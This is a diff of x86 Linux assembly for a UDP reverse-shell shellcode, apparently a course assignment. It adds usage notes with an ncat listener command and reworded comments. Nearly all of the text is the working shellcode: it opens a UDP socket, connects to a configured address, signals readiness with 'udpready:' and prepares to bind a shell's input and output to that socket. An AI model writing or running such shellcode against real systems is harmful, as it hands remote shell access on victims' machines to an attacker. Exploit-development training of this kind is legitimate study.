@@ -3,6 +3,10 @@
 ; syscall available here /usr/include/linux/net.h
 ; assignment : 2. create a reverse shell  
 ; originality : using UDP instead TCP 
+; usage : ncat -lup 1234 on the receiving end 
+; udp        0      0 127.0.0.1:49955         127.0.0.1:1234          ESTABLISHED 4359/udprevshell
+; udp        0      0 127.0.0.1:1234          127.0.0.1:49955         ESTABLISHED 4358/ncat 
+;
 
 %define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
 %define _port 1234              ; port  
@@ -16,7 +20,7 @@ global _start
 _start: 
 
 
-; again we create socket fd, using syscall 0x66 and argument SYS_SOCKET so ebx = 1  
+; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1  
 push   0x66 
 pop    eax    
 push   0x1  
@@ -29,10 +33,10 @@ push   0x2
 mov    ecx,esp
 int    0x80
 
-; then we call connect on this UDP socket  
-; we push ip address 
+; then we call connect on this UDP socket (to use send()) 
+; we push ip address as argument 
 push   _ip
-; we push port 
+; we push port as argument 
 push word PORT
 xor    cx,cx
 add   cl,0x2
@@ -42,23 +46,23 @@ push   0x10
 push   ecx
 push   eax
 mov    ecx,esp
-; we save fd received by socket creation which was still in eax  
+; we save fd received by socket creation, which is still in eax, before using the register   
 mov    esi,eax
 mov    al,0x66  
 add    bl,0x2   
 int    0x80
 
 
-; now we send a UDP packet to open firewall   
+; now we send a UDP packet to open stateful firewall
 mov eax,0x66 
-; the send function is ssize_t send(int sockfd, const void *buf, size_t len, int flags);
-; we will send "udpready" string to let the distant server know the shellcode is working  
+; fmi, the send function is ssize_t send(int sockfd, const void *buf, size_t len, int flags);
+; we will send "udpready:" string to let the distant server know the shellcode is working and ready   
 push 0x0a3a7964 
 push 0x72706475  
 mov edx,esp
-; no flags 
+; no flags needed 
 push 0x0 
-; size is 8 
+; size of message to be sent is 8 
 push 0x8 
 push edx 
 push esi 
@@ -66,12 +70,15 @@ mov ecx,esp
 mov ebx,0x9 
 int 0x80 
 
-; need to loop here ? 
-; wait for UDP packet to be processed 
+; wait for a UDP packet to be processed to confirm connection, not necessary but i like it =) 
 mov eax,0x66 
 mov ebx,0xa
-; recv socket 
+; recv socket call 
 int 0x80 
+
+; the rest is similar to assignment 1 and is a copy paste 
+
+
 
 
 ; duplicating fd from socket to stdin stdout stderr of the process 
